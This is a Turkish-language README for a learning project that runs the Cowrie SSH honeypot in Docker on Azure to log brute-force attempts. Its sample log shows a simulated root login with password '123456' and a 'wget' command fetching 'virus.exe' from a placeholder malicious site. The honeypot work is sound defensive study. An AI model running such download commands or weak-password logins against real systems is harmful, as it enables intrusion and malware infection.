# Cloud-Native Honeypot & Threat Analysis Project

## 🇹🇷 Proje Özeti
Bu proje, bulut tabanlı bir ortamda (Azure Infrastructure) Docker konteyner teknolojisi kullanılarak oluşturulmuş bir **Siber Güvenlik Tuzağı (Honeypot)** uygulamasıdır.

Amaç, gerçek bir sunucuyu taklit ederek saldırgan davranışlarını analiz etmek, "Brute-Force" (Kaba Kuvvet) saldırılarını loglamak ve güvenli bir izole ortamda tehdit istihbaratı toplamaktır.

## 🛠 Kullanılan Teknolojiler
* **Cloud:** Microsoft Azure (via GitHub Codespaces)
* **Containerization:** Docker & Docker CLI
* **Security:** Cowrie (High interaction SSH Honeypot)
* **OS:** Linux (Ubuntu Server)
* **Networking:** Port Forwarding & TCP/IP Analysis

## 🚀 Nasıl Çalışır?
1.  **İzolasyon:** Sistem, ana işletim sisteminden izole bir Docker konteyneri içinde çalışır.
2.  **Aldatma (Deception):** 2223 portu üzerinden gelen istekleri karşılar ve saldırgana sahte bir dosya sistemi sunar.
3.  **Loglama:** Saldırganın denediği kullanıcı adları, şifreler ve çalıştırdığı komutlar json formatında kaydedilir.

## 📊 Örnek Saldırı Logu (Kanıt)
Proje geliştirme sürecinde simüle edilen bir saldırı girişimi:

> `Login attempt [root/123456] succeeded`
> `CMD: wget http://malicious-site.com/virus.exe`

---
*Bu proje, modern DevSecOps süreçlerini ve Bulut Güvenliği prensiplerini öğrenmek amacıyla geliştirilmiştir.*